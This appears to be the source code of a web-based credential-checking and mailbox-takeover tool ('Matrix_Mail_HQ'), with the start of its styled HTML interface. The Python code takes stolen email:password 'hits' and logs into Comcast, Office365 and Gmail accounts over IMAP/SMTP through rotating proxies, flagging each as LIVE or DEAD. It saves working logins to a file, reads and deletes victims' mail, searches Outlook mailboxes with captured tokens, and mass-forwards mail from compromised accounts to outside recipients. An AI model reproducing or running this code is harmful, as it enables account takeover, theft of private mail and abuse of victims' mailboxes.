                        res["attachments"].append(prt.get_filename())
                    elif ct == 'text/plain': res["text"] = clean_s(payload.decode(errors='ignore'))
                    elif ct == 'text/html': res["html"] = clean_s(payload.decode(errors='ignore'))
        else:
            payload = msg.get_payload(decode=True)
            if isinstance(payload, (bytes, bytearray)):
                pld = clean_s(payload.decode(errors='ignore'))
                if str(msg.get_content_type()).lower()=='text/html': res["html"]=pld
                else: res["text"]=pld
        return res
    except Exception as e: return {"error": str(e)}

@app.post("/api/mail/forward")
async def api_mail_forward(req: Request):
    try:
        d = await req.json(); hit = d.get('hit'); folder = d.get('folder'); mid = d.get('mid'); target = d.get('target')
        user, pwd = get_user_pass(hit); ih, ip, _, _, sh, sp = discover_server(user.split('@')[-1])
        body_data = get_body(hit, folder, mid)
        if "error" in body_data: return body_data
        msg = MIMEMultipart()
        msg['From'] = user; msg['To'] = target; msg['Subject'] = f"Fwd: {body_data.get('sub','')}"
        content = body_data.get('html') if body_data.get('html') else body_data.get('text','')
        msg.attach(MIMEText(content, 'html' if body_data.get('html') else 'plain'))
        
        dom = user.split('@')[-1].lower()
        hosts_to_try = [(sh, sp)]
        if any(m in dom for m in MICROSOFT):
            hosts_to_try = [
                ("smtp-mail.outlook.com", 587),
                ("smtp.office365.com", 587),
                ("smtp.live.com", 587)
            ]
        elif any(g in dom for g in GMAIL):
            hosts_to_try = [("smtp.gmail.com", 465), ("smtp.gmail.com", 587)]
        elif 'yahoo' in dom:
            hosts_to_try = [("smtp.mail.yahoo.com", 465), ("smtp.mail.yahoo.com", 587)]
        else:
            hosts_to_try.extend([("smtp." + dom, 587), ("smtp." + dom, 465), ("mail." + dom, 587), ("mail." + dom, 465)])
            
        last_err = ""
        for h, p in hosts_to_try:
            try:
                if p == 465:
                    with smtplib.SMTP_SSL(h, p, timeout=15, context=ctx) as s:
                        s.ehlo(h)
                        s.login(user, pwd)
                        s.send_message(msg)
                else:
                    with smtplib.SMTP(h, p, timeout=15) as s:
                        s.ehlo(h)
                        try:
                            s.starttls(context=ctx)
                            s.ehlo(h)
                        except smtplib.SMTPNotSupportedError:
                            pass
                        s.login(user, pwd)
                        s.send_message(msg)
                return {"ok": True}
            except Exception as se:
                last_err = str(se)
                continue
        return {"error": last_err}
    except Exception as e: return {"error": str(e)}

@app.get("/api/mail/delete")
def api_mail_delete(hit: str, folder: str, mid: str, srv: str | None = None, port: int | None = None):
    try:
        user, pwd = get_user_pass(hit)
        if srv and port:
            ih, ip = srv, int(port)
        else:
            ih, ip, _, _, _, _ = discover_server(user.split('@')[-1])
            
        with imaplib.IMAP4_SSL(ih, ip, timeout=12, ssl_context=ctx) as m:
            m.login(user, pwd); m.select(f'"{folder}"'); m.store(mid, '+FLAGS', '\\Deleted'); m.expunge()
            return {"ok": True}
    except Exception as e: return {"error": str(e)}

# --- OWA SEARCH-BASED EMAIL VIEWER (for Microsoft accounts) ---
# Uses the same OWA search API already proven to work with the M365.Access token.
# Standard REST v2 mailfolders requires Mail.Read scope which this token does NOT have.

_OWA_FOLDER_FILTERS = {
    "Inbox":         "inbox",
    "Sent Items":    "sentitems",
    "Drafts":        "drafts",
    "Deleted Items": "deleteditems",
    "Junk Email":    "junkemail",
    "Archive":       "archive",
}

def _owa_search(token: str, cid: str, folder: str, query: str, page: int = 1, size: int = 50) -> dict:
    """Run the confirmed-working OWA search API."""
    skip = (page - 1) * size
    folder_filter = _OWA_FOLDER_FILTERS.get(folder, folder.lower())
    payload = {
        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "Egypt Standard Time",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Message",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": folder_filter}}]},
            "From": skip,
            "Query": {"QueryString": query if query else ""},
            "Size": size,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
            "EnableTopResults": False,
        }]
    }
    if not query:  # pyre-ignore[be05c1cb,ccfef483,b4eb8968]
        cast_pl: Any = payload["EntityRequests"]
        if isinstance(cast_pl, list) and cast_pl:
            cast_pl[0]["Query"] = {"QueryString": ""}
    headers = {
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}" if cid else "",
        "Content-Type": "application/json"
    }
    r = requests.post("https://outlook.live.com/search/api/v2/query",
                      json=payload, headers=headers, timeout=20)
    return r.json()

@app.get("/api/mail/owa/folders")
def get_owa_folders(hit: str):
    try:
        user, _ = get_user_pass(hit)
        if not user: return {"error": "Invalid hit"}
        tok_data = state.oauth_tokens.get(user, {})
        token = tok_data.get("token", "")
        if not token:
            return {"error": "No OAuth token — validate this account via Outlook Checker tab first, then click View."}
        # Return hardcoded standard Outlook folders (can't enumerate via search API)
        folders = [{"name": k, "count": "?", "id": v} for k, v in _OWA_FOLDER_FILTERS.items()]
        return {"folders": folders, "type": "owa"}
    except Exception as e: return {"error": str(e)}

@app.get("/api/mail/owa/messages")
def get_owa_messages(hit: str, folder_id: str = "inbox", page: int = 1, q: str = ""):
    try:
        user, _ = get_user_pass(hit)
        if not user: return {"msgs": [], "total": 0, "error": "Invalid hit"}
        tok_data = state.oauth_tokens.get(user, {})
        token = tok_data.get("token", "")
        cid = tok_data.get("cid", "")
        if not token: return {"msgs": [], "total": 0, "error": "No token"}
        # Resolve folder name from id (folder_id is the display name in OWA mode)
        folder_name = folder_id  # passed as display name from JS
        # Strict OWA search syntax
        owa_q = f'(subject:"{q}" OR body:"{q}")' if q else ""
        data = _owa_search(token, cid, folder_name, owa_q, page)
        msgs = []
        # Parse OWA search response
        for er in (data.get("EntitySets") or []):  # pyre-ignore[a94985f6]
            er_dict: Any = er
            rs = er_dict.get("ResultSets") or []
            rs_first = rs[0] if rs else []  # pyre-ignore[e0facbe5]
            for hit_item in rs_first:
                props = hit_item.get("Source") or hit_item
                # Try to extract fields from different OWA response shapes
                mid = (props.get("ItemId") or props.get("ConversationId") or {}).get("Id", "") or str(props.get("ReferenceId", ""))
                sub = props.get("Subject") or ""
                frm = (props.get("From") or {}).get("Name") or (props.get("From") or {}).get("EmailAddress") or ""
                dt = str(props.get("DateTimeReceived") or props.get("LastModifiedTime") or "")[:10]  # pyre-ignore[37f626e3,2eb1b43e]
                snippet = props.get("BodyFeedback") or props.get("Preview") or ""
                msgs.append({"id": mid, "sub": sub, "from": frm, "date": dt, "snippet": snippet})
        # Alternative parsing (flat hit list)
        if not msgs:
            for hit_item in (data.get("Value") or data.get("value") or []):
                props = hit_item.get("Source") or hit_item
                mid = (props.get("ItemId") or {}).get("Id", "") or str(props.get("ReferenceId", ""))
                sub = props.get("Subject") or ""
                frm = (props.get("From") or {}).get("Name") or ""
                dt = str(props.get("DateTimeReceived") or "")[:10]  # pyre-ignore[2dbeaf37,c9f8501f]
                snippet = props.get("Preview") or ""
                if mid or sub:
                    msgs.append({"id": mid, "sub": sub, "from": frm, "date": dt, "snippet": snippet})
        return {"msgs": msgs, "total": len(msgs)}
    except Exception as e: return {"msgs": [], "total": 0, "error": str(e)}

@app.get("/api/mail/owa/body")
def get_owa_body(hit: str, msg_id: str):
    try:
        user, _ = get_user_pass(hit)
        if not user: return {"error": "Invalid hit"}
        tok_data = state.oauth_tokens.get(user, {})
        token = tok_data.get("token", "")
        cid = tok_data.get("cid", "")
        if not token: return {"error": "No OAuth token. Run Outlook Checker first."}
        # Try fetching via GetItem EWS-lite endpoint (OWA internal, same auth works)
        headers = {
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}" if cid else user,
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        # Try OWA item fetch
        item_payload = {
            "request": {
                "itemIds": [{"Id": msg_id}],
                "itemShape": {"baseShape": "AllProperties", "bodyType": "HTML"}
            }
        }
        r = requests.post("https://outlook.live.com/owa/0/service.svc?action=GetItem&osp=1",
                          json=item_payload, headers=headers, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                item = ((d.get("Body") or {}).get("Items") or [{}])[0]
                body_html = item.get("Body", {}).get("Value", "") if isinstance(item.get("Body"), dict) else ""
                frm: Any = (item.get("From") or {}).get("Mailbox", {})  # pyre-ignore[ae52e577,8903ff20]
                return {
                    "sub": item.get("Subject", ""),
                    "from": frm.get("Name") or frm.get("EmailAddress", ""),  # pyre-ignore[6a8332ac,cdd56699]
                    "html": body_html,
                    "text": ""
                }
            except: pass
        # Fallback: return snippet from search
        return {"sub": f"[Message ID: {str(msg_id)[:24]}...]", "from": "", "html": "",  # pyre-ignore[51248120,f24062d4]
                "text": "Full body not available for this account type. Outlook Checker accounts use OAuth web auth — IMAP body requires app password."}
    except Exception as e: return {"error": str(e)}


# ============================================
# NEW ENDPOINTS - COMCAST, OFFICE365, FORWARDING
# ============================================

@app.post("/api/comcast/check")
async def check_comcast(data: Request):
    """Check Comcast IMAP access (pure mail access) so account is usable in mail viewer"""
    req = await data.json()
    email = req.get("email", "").strip()
    password = req.get("password", "").strip()
    timeout = int(req.get("timeout", 15))
    proxies = req.get("proxies", [])
    
    if not email or not password:
        return {"error": "Missing email or password"}
    
    try:
        # Pick a proxy if available
        proxy_cfg = None
        if proxies:
            # Parse fresh proxies specific to this request
            parsed_proxies = [parse_proxy_string(p) for p in proxies if p]
            parsed_proxies = [p for p in parsed_proxies if p]
            if parsed_proxies:
                proxy_cfg = random.choice(parsed_proxies)
        elif state.parsed_proxies:
            proxy_cfg = random.choice(state.parsed_proxies)
        
        host, port = "imap.comcast.net", 993
        if proxy_cfg:
            imap_conn = ProxyIMAP_SSL(host, port, ssl_context=ctx, timeout=timeout, proxy_config=proxy_cfg)
        else:
            imap_conn = imaplib.IMAP4_SSL(host, port, ssl_context=ctx, timeout=timeout)
            
        imap_conn.login(email, password)
        status, mailboxes = imap_conn.list()
        imap_conn.logout()
        
        result = {
            "status": "LIVE",
            "email": email,
            "server": host,
            "port": port,
            "viewer_ready": True
        }
        with state.lock:
            state.comcast_live += 1
            state.comcast_results.append(result)
            state.forward_log.append(f"✓ Comcast: {email} - LIVE")
        on_success(email, password, f"{host}:{port}", "IMAP")
        
        return result
        
    except Exception as e:
        with state.lock:
            state.forward_log.append(f"✗ Comcast: {email} - DEAD ({str(e)})")
        return {"error": str(e), "status": "DEAD"}

@app.post("/api/office365/check")
async def check_office365(data: Request):
    """Check Office365 SMTP with multiple server fallbacks"""
    req = await data.json()
    email = req.get("email", "").strip()
    password = req.get("password", "").strip()
    
    if not email or not password:
        return {"error": "Missing email or password"}
    
    try:
        result = await check_office365_smtp(email, password)
        if result["status"] == "LIVE":
            with state.lock:
                state.office365_live += 1
                state.office365_results.append(result)
                state.forward_log.append(f"✓ Office365: {email} - LIVE")
            # Save to file
            with open("Valid.txt", "a") as f:
                f.write(f"{email}:{password}|Office365\n")
        else:
            with state.lock:
                state.forward_log.append(f"✗ Office365: {email} - DEAD")
        
        return result
    except Exception as e:
        return {"error": str(e), "status": "ERROR"}

@app.post("/api/forward/inbox-to-inbox")
async def forward_inbox_to_inbox(data: Request):
    """Forward emails from one inbox to multiple recipients"""
    req = await data.json()
    source_email = req.get("source_email", "").strip()
    source_password = req.get("source_password", "").strip()
    target_emails = req.get("target_emails", [])
    limit = req.get("limit", 50)
    mark_read = req.get("mark_as_read", False)
    
    if not source_email or not source_password or not target_emails:
        return {"error": "Missing required fields"}
    
    try:
        state.forward_running = True
        result = await forward_emails_inbox_to_inbox(
            source_email, source_password, target_emails, limit, mark_read
        )
        
        with state.lock:
            state.forward_total += 1
            if result.get("success"):
                state.forward_success += 1
                state.forward_log.append(
                    f"✓ Forwarded {result.get('forwarded', 0)} from {source_email} to {len(target_emails)} recipients"
                )
            else:
                state.forward_failed += 1
                state.forward_log.append(f"✗ Failed: {source_email} - {result.get('error', 'Unknown')}")
            
            state.forward_results.append(result)
        
        state.forward_running = False
        return result
    except Exception as e:
        state.forward_running = False
        return {"error": str(e), "success": False}

@app.post("/api/forward/mass")
async def mass_forward_emails(data: Request, background_tasks: BackgroundTasks):
    """Mass forward from multiple valid accounts to target recipients"""
    req = await data.json()
    valid_emails = req.get("valid_emails", [])
    target_recipients = req.get("target_recipients", [])
    max_per_account = req.get("max_emails_per_account", 20)
    delay = req.get("delay_between_accounts", 2.0)
    
    if not valid_emails or not target_recipients:
        return {"error": "Missing valid emails or target recipients"}
    
    async def _do_mass_forward():
        state.forward_running = True
        try:
            result = await mass_forward_to_inbox(
                valid_emails, target_recipients, max_per_account, delay
            )
            with state.lock:
                state.forward_results.append(result)
                state.forward_log.append(
                    f"Mass forward completed: {result.get('total_forwarded', 0)} sent from "
                    f"{result.get('accounts_processed', 0)} accounts"
                )
        except Exception as e:
            with state.lock:
                state.forward_log.append(f"✗ Mass forward error: {str(e)}")
        finally:
            state.forward_running = False
    
    background_tasks.add_task(_do_mass_forward)
    return {
        "status": "STARTED",
        "message": "Mass forwarding operation started in background",
        "accounts": len(valid_emails),
        "targets": len(target_recipients)
    }

@app.post("/api/sender/powerful")
async def powerful_send(data: Request):
    """Powerful SMTP sender with attachments, HTML, retry logic"""
    req = await data.json()
    from_email = req.get("from_email", "").strip()
    from_password = req.get("from_password", "").strip()
    to_emails = req.get("to_emails", [])
    subject = req.get("subject", "")
    body = req.get("body", "")
    html_body = req.get("html_body")
    attachments = req.get("attachments", [])
    signature = req.get("signature")
    encrypt_body = req.get("encrypt_body", False)
    retry_count = req.get("retry_count", 3)
    
    if not from_email or not from_password or not to_emails:
        return {"error": "Missing required fields"}
    
    try:
        state.sender_running = True
        result = await powerful_smtp_sender(
            from_email, from_password, to_emails, subject, body,
            html_body, attachments, signature, encrypt_body, retry_count
        )
        
        with state.lock:
            state.sent_count += result.get("sent", 0)
            state.failed_count += result.get("failed", 0)
            state.sender_log.append(
                f"Sent: {result.get('sent', 0)}, Failed: {result.get('failed', 0)}"
            )
        
        state.sender_running = False
        return result
    except Exception as e:
        state.sender_running = False
        return {"error": str(e), "success": False}

@app.get("/api/forward/status")
async def get_forward_status():
    """Get forwarding operation status"""
    with state.lock:
        return {
            "running": state.forward_running,
            "total": state.forward_total,
            "success": state.forward_success,
            "failed": state.forward_failed,
            "recent_logs": list(state.forward_log[-20:]),
            "results_count": len(state.forward_results)
        }

@app.get("/api/comcast/status")
async def get_comcast_status():
    """Get Comcast checker status"""
    with state.lock:
        return {
            "running": state.comcast_running,
            "checked": state.comcast_checked,
            "live": state.comcast_live,
            "results": state.comcast_results[-10:] if state.comcast_results else []
        }

@app.get("/api/office365/status")
async def get_office365_status():
    """Get Office365 checker status"""
    with state.lock:
        return {
            "running": state.office365_running,
            "checked": state.office365_checked,
            "live": state.office365_live,
            "results": state.office365_results[-10:] if state.office365_results else []
        }

# ============================================
# ENHANCED API ENDPOINTS (v12.2 OMEGA+)
# ============================================

@app.post("/api/mail/access/check")
async def check_mail_access(request: Request):
    """Check mail access (IMAP/SMTP/POP3/Inbox)"""
    data = await request.json()
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    
    if not email or not password:
        return JSONResponse({"error": "Email and password required"}, status_code=400)
    
    results = {
        "email": email,
        "imap": MailAccessChecker.check_imap_access(email, password),
        "smtp": MailAccessChecker.check_smtp_access(email, password),
        "inbox": MailAccessChecker.check_inbox_access(email, password)
    }
    return JSONResponse(results)

@app.post("/api/mail/comcast/check")
async def check_comcast_new(request: Request):
    """Check Comcast mail account"""
    data = await request.json()
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    
    if not email or not password:
        return JSONResponse({"error": "Email and password required"}, status_code=400)
    
    result = ComcastMailChecker.full_check(email, password)
    return JSONResponse(result)

@app.post("/api/mail/office365/check")
async def check_office365_new(request: Request):
    """Check Office365/Outlook mail account"""
    data = await request.json()
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    
    if not email or not password:
        return JSONResponse({"error": "Email and password required"}, status_code=400)
    
    result = {
        "email": email,
        "imap": OfficeMailChecker.check_imap(email, password),
        "smtp": OfficeMailChecker.check_smtp(email, password),
        "timestamp": datetime.datetime.now().isoformat()
    }
    return JSONResponse(result)

@app.post("/api/mail/gmail/check")
async def check_gmail_new(request: Request):
    """Check Gmail mail account (No WebAuth)"""
    data = await request.json()
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    
    if not email or not password:
        return JSONResponse({"error": "Email and password required"}, status_code=400)
    
    result = GmailMailChecker.full_check(email, password)
    
    # Update global stats for dashboard tracking
    with state.lock:
        state.gmail_checked += 1
        if result["imap_check"]["accessible"] or result["smtp_check"]["accessible"]:
            state.gmail_live += 1
            state.gmail_results.append(result)
            state.forward_log.append(f"✓ Gmail: {email} - LIVE")
        else:
            state.forward_log.append(f"✗ Gmail: {email} - DEAD")
            
    return JSONResponse(result)

@app.get("/api/gmail/status")
async def get_gmail_status():
    """Get Gmail checker status"""
    with state.lock:
        return {
            "running": state.gmail_running,
            "checked": state.gmail_checked,
            "live": state.gmail_live,
            "results": state.gmail_results[-10:] if state.gmail_results else []
        }

@app.post("/api/mail/verify/bulk")
async def verify_bulk_emails(request: Request):
    """Verify multiple emails at once"""
    data = await request.json()
    emails = data.get("emails", [])
    password = data.get("password", "")
    
    if not emails or not password:
        return JSONResponse({"error": "Emails list and password required"}, status_code=400)
    
    results = []
    for email in emails[:10]:
        imap_result = MailAccessChecker.check_imap_access(email, password)
        smtp_result = MailAccessChecker.check_smtp_access(email, password)
        results.append({
            "email": email,
            "imap_access": imap_result["accessible"],
            "smtp_access": smtp_result["accessible"]
        })
    
    return JSONResponse({"results": results})

@app.get("/api/mail/sent/logs")
async def get_sent_logs():
    """Get email delivery logs"""
    try:
        logs = []
        if os.path.exists(SENT_LOG_FILE):
            with open(SENT_LOG_FILE, 'r') as f:
                logs = f.readlines()
        return JSONResponse({"logs": logs[-100:]})
    except:
        return JSONResponse({"error": "Could not read logs"}, status_code=500)

@app.get("/favicon.ico", include_in_schema=False)
def favicon():
    if os.path.exists('maildigger_logo_branded.png'): return FileResponse('maildigger_logo_branded.png')
    return JSONResponse({"error": "not found"}, status_code=404)

@app.get("/logo.jpg")
def get_logo(): 
    return FileResponse(Path(__file__).parent / 'logo.jpg')

@app.get("/bat_logo.jpg")
def get_bat_logo(): 
    if os.path.exists('bat_logo.jpg'): return FileResponse('bat_logo.jpg')
    return JSONResponse({"error": "not found"}, status_code=404)

@app.get("/splash.png")
def get_splash():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    splash_path = os.path.join(base_dir, 'maildigger_splash_bg.png')
    if os.path.exists(splash_path): return FileResponse(splash_path)
    return JSONResponse({"error": "not found"}, status_code=404)

@app.get("/wolf-audio")
def get_wolf_audio():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    wolf_path = os.path.join(base_dir, 'Assets', 'Wolf.mp3')
    if os.path.exists(wolf_path): return FileResponse(wolf_path, media_type='audio/mpeg')
    return JSONResponse({"error": f"Wolf.mp3 not found at {wolf_path}"}, status_code=404)


# --- UI DEFINITION ---
UI_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix_Mail_HQ V12.2 | @Hamzatostospospos</title>
    <meta name="author" content="Hamzatostospospos">
    <link rel="icon" type="image/png" href="logo.jpg">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">

<style>
.editor-toolbar { display: flex; gap: 8px; align-items: center; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px 8px 0 0; padding: 6px 12px; border-bottom: none; overflow-x: auto; }
.editor-toolbar button { background: transparent; border: 1px solid transparent; color: var(--text-primary); border-radius: 4px; padding: 4px 8px; cursor: pointer; transition: 0.2s; font-size: 0.8rem; font-weight: bold; }
.editor-toolbar button:hover { background: var(--bg-sidebar); border-color: var(--border); }
.editor-toolbar input[type="color"], .editor-toolbar select { background: var(--bg-sidebar); border: 1px solid var(--border); color: var(--text-primary); border-radius: 4px; padding: 2px 4px; font-size: 0.75rem; }
.editor-content { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0 0 8px 8px; padding: 12px; height: 180px; overflow-y: auto; color: var(--text-primary); font-size: 0.85rem; outline: none; line-height: 1.4; }
.editor-content:focus { border-color: var(--accent); }
:root {
    --accent: #ff003c;
    --accent-secondary: #ff4d4d;
    --accent-glow: rgba(255, 0, 60, 0.5);
    --accent-glow-strong: rgba(255, 0, 60, 0.7);
    --bg-main: #06080c;
    --bg-sidebar: #0a0d15;
    --bg-card: #111620;
    --bg-card-hover: #151c28;
    --border: #1e2a3a;
    --border-light: #263548;
    --text-primary: #e8edf5;
    --text-secondary: #7c8da6;
    --text-muted: #556278;
    --hover: #1a2332;
    --success: #10b981;
    --danger: #ef4444;
    --warning: #f59e0b;
    --info: #3b82f6;
    --glass-bg: rgba(17, 22, 32, 0.75);
    --glass-border: rgba(30, 42, 58, 0.6);
    --glass-blur: blur(16px);
    --shadow-card: 0 8px 32px rgba(0,0,0,0.4);
    --shadow-glow: 0 0 30px var(--accent-glow);
    --radius-sm: 10px;
    --radius-md: 16px;
    --radius-lg: 24px;
    --radius-xl: 32px;
    --transition-fast: 0.15s cubic-bezier(0.4, 0, 0.2, 1);
    --transition-smooth: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    --transition-bounce: 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
}

* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background: var(--bg-main);
    color: var(--text-primary);
    font-family: 'Outfit', -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex;
    height: 100vh;
    overflow: hidden;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

/* ─── Splash Screen ─── */
#splash {
    position: fixed;
    top: 0; left: 0; width: 100vw; height: 100vh;
    background: radial-gradient(ellipse at center, #0a0d15 0%, #020408 100%);
    z-index: 9999;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    transition: opacity 0.6s ease, visibility 0.6s;
    overflow: hidden;
}
#splash.hidden { opacity: 0; visibility: hidden; pointer-events: none; }

/* ─── Flying Bats ─── */
.bat {
    position: absolute;
    pointer-events: none;
    filter: drop-shadow(0 0 6px rgba(0, 255, 163, 0.3));
    animation-timing-function: ease-in-out;
    animation-iteration-count: infinite;
    opacity: 0;
    z-index: 1;
    transform-origin: center center;
}
.bat svg { width: 100%; height: 100%; display: block; animation: wingBeat 0.25s ease-in-out infinite; }

.bat-1 { width: 48px; height: 24px; top: 12%; left: -60px; animation: batFlight1 12s 0s infinite; }
.bat-2 { width: 36px; height: 18px; top: 25%; left: -50px; animation: batFlight2 14s 2s infinite; }
.bat-3 { width: 56px; height: 28px; top: 8%; right: -70px; animation: batFlight3 16s 1s infinite; }
.bat-4 { width: 30px; height: 15px; top: 40%; left: -45px; animation: batFlight4 11s 3s infinite; }
.bat-5 { width: 44px; height: 22px; top: 18%; right: -60px; animation: batFlight5 18s 4s infinite; }
.bat-6 { width: 38px; height: 19px; top: 55%; left: -55px; animation: batFlight6 13s 5s infinite; }
.bat-7 { width: 50px; height: 25px; top: 35%; right: -65px; animation: batFlight7 15s 1.5s infinite; }
.bat-8 { width: 28px; height: 14px; top: 65%; left: -40px; animation: batFlight8 10s 6s infinite; }
.bat-9 { width: 42px; height: 21px; top: 70%; right: -55px; animation: batFlight9 17s 3.5s infinite; }
.bat-10 { width: 52px; height: 26px; top: 5%; left: -65px; animation: batFlight10 20s 7s infinite; }
.bat-11 { width: 34px; height: 17px; top: 50%; right: -50px; animation: batFlight11 14s 8s infinite; }
.bat-12 { width: 46px; height: 23px; top: 78%; left: -48px; animation: batFlight12 19s 2.5s infinite; }

/* Wing flap - rapid wing beat overlay on the SVG itself */
@keyframes wingBeat {
    0%, 100% { transform: scaleY(1); }
    50% { transform: scaleY(0.55); }
}

/* Wing flap - pulse the bat's scale subtly for bigger swoops */
@keyframes wingFlap {
    0%, 100% { transform: scaleY(1); }
    25% { transform: scaleY(0.7); }
    75% { transform: scaleY(1.15); }
}

/* Flight paths — swooping across the screen */
@keyframes batFlight1 {
    0% { opacity: 0; transform: translate(0, 0) rotate(-8deg) scaleY(1); }
    5% { opacity: 0.7; }
    15% { transform: translate(25vw, 80px) rotate(5deg) scaleY(0.7); }
    30% { transform: translate(55vw, -40px) rotate(-3deg) scaleY(1.1); }
    50% { transform: translate(80vw, 120px) rotate(8deg) scaleY(0.6); }
    70% { transform: translate(105vw, -60px) rotate(-5deg) scaleY(1.05); }
    85% { opacity: 0.7; transform: translate(115vw, 30px) rotate(2deg) scaleY(0.8); }
    100% { opacity: 0; transform: translate(120vw, -20px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight2 {
    0% { opacity: 0; transform: translate(0, 0) rotate(6deg) scaleY(0.8); }
    8% { opacity: 0.6; }
    20% { transform: translate(30vw, -50px) rotate(-4deg) scaleY(1.2); }
    40% { transform: translate(60vw, 90px) rotate(7deg) scaleY(0.6); }
    60% { transform: translate(90vw, -30px) rotate(-6deg) scaleY(1.1); }
    80% { opacity: 0.6; transform: translate(110vw, 50px) rotate(3deg) scaleY(0.7); }
    100% { opacity: 0; transform: translate(120vw, -10px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight3 {
    0% { opacity: 0; transform: translate(0, 0) rotate(10deg) scaleY(1.1); }
    5% { opacity: 0.5; }
    18% { transform: translate(-20vw, 100px) rotate(-2deg) scaleY(0.6); }
    35% { transform: translate(-50vw, -60px) rotate(8deg) scaleY(1.15); }
    55% { transform: translate(-80vw, 130px) rotate(-7deg) scaleY(0.5); }
    75% { transform: translate(-105vw, -40px) rotate(4deg) scaleY(1.0); }
    90% { opacity: 0.5; transform: translate(-115vw, 70px) rotate(-3deg) scaleY(0.8); }
    100% { opacity: 0; transform: translate(-120vw, 0) rotate(0deg) scaleY(1); }
}
@keyframes batFlight4 {
    0% { opacity: 0; transform: translate(0, 0) rotate(-12deg) scaleY(0.7); }
    10% { opacity: 0.55; }
    30% { transform: translate(40vw, -80px) rotate(6deg) scaleY(1.2); }
    55% { transform: translate(75vw, 60px) rotate(-4deg) scaleY(0.5); }
    75% { transform: translate(100vw, -70px) rotate(9deg) scaleY(1.05); }
    88% { opacity: 0.55; transform: translate(112vw, 20px) rotate(-5deg) scaleY(0.75); }
    100% { opacity: 0; transform: translate(120vw, -30px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight5 {
    0% { opacity: 0; transform: translate(0, 0) rotate(-5deg) scaleY(1); }
    6% { opacity: 0.45; }
    22% { transform: translate(-25vw, -70px) rotate(7deg) scaleY(0.65); }
    45% { transform: translate(-60vw, 110px) rotate(-8deg) scaleY(1.1); }
    65% { transform: translate(-90vw, -50px) rotate(3deg) scaleY(0.55); }
    82% { opacity: 0.45; transform: translate(-108vw, 40px) rotate(-6deg) scaleY(0.9); }
    100% { opacity: 0; transform: translate(-120vw, -15px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight6 {
    0% { opacity: 0; transform: translate(0, 0) rotate(4deg) scaleY(0.9); }
    7% { opacity: 0.65; }
    25% { transform: translate(35vw, 50px) rotate(-7deg) scaleY(0.5); }
    48% { transform: translate(70vw, -90px) rotate(6deg) scaleY(1.2); }
    68% { transform: translate(95vw, 30px) rotate(-3deg) scaleY(0.6); }
    83% { opacity: 0.65; transform: translate(110vw, -45px) rotate(5deg) scaleY(0.85); }
    100% { opacity: 0; transform: translate(120vw, 10px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight7 {
    0% { opacity: 0; transform: translate(0, 0) rotate(-9deg) scaleY(0.75); }
    9% { opacity: 0.5; }
    28% { transform: translate(-30vw, -100px) rotate(5deg) scaleY(1.15); }
    50% { transform: translate(-65vw, 60px) rotate(-6deg) scaleY(0.45); }
    72% { transform: translate(-95vw, -30px) rotate(8deg) scaleY(1.05); }
    86% { opacity: 0.5; transform: translate(-110vw, 80px) rotate(-4deg) scaleY(0.7); }
    100% { opacity: 0; transform: translate(-120vw, -5px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight8 {
    0% { opacity: 0; transform: translate(0, 0) rotate(7deg) scaleY(0.85); }
    8% { opacity: 0.5; }
    30% { transform: translate(45vw, -30px) rotate(-5deg) scaleY(1.1); }
    58% { transform: translate(80vw, 80px) rotate(6deg) scaleY(0.5); }
    78% { transform: translate(105vw, -55px) rotate(-7deg) scaleY(0.95); }
    90% { opacity: 0.5; transform: translate(115vw, 15px) rotate(3deg) scaleY(0.7); }
    100% { opacity: 0; transform: translate(120vw, -25px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight9 {
    0% { opacity: 0; transform: translate(0, 0) rotate(-3deg) scaleY(1.05); }
    6% { opacity: 0.4; }
    20% { transform: translate(-20vw, -40px) rotate(8deg) scaleY(0.6); }
    42% { transform: translate(-55vw, 90px) rotate(-5deg) scaleY(1.2); }
    64% { transform: translate(-85vw, -80px) rotate(4deg) scaleY(0.5); }
    82% { opacity: 0.4; transform: translate(-105vw, 25px) rotate(-7deg) scaleY(0.85); }
    100% { opacity: 0; transform: translate(-120vw, -35px) rotate(0deg) scaleY(1); }
}
@keyframes batFlight10 {
    0% { opacity: 0; transform: translate(0, 0) rotate(-11deg) scaleY(0.6); }
    4% { opacity: 0.6; }
    16% { transform: translate(20vw, 60px) rotate(4deg) scaleY(1.2); }
    34% { transform: translate(50vw, -70px) rotate(-8deg) scaleY(0.5); }
    56% { transform: translate(78vw, 100px) rotate(7deg) scaleY(1.1); }
    74% { transform: translate(100vw, -40px) rotate(-3deg) scaleY(0.55); }
    88% { opacity: 0.6; transform: translate(114vw, 50px) rotate(5deg) scaleY(0.8); }
